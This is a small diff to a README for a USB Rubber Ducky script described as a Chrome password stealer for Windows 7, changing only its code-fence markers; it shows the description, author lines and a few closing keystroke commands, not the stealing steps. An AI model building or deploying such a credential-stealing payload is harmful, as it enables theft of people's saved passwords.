@@ -1,7 +1,7 @@
 Steals Chrome passwords in the blink of an eye.
 Credits: This payload was created by nuk3leus
 
-'''
+```
 REM Author: Nuk3leus
 REM Ducky chrome password stealer: 1.0
 REM Target: Windows 7
@@ -112,4 +112,4 @@ ENTER
 DELAY 3000
 STRING exit
 ENTER
-'''
+```
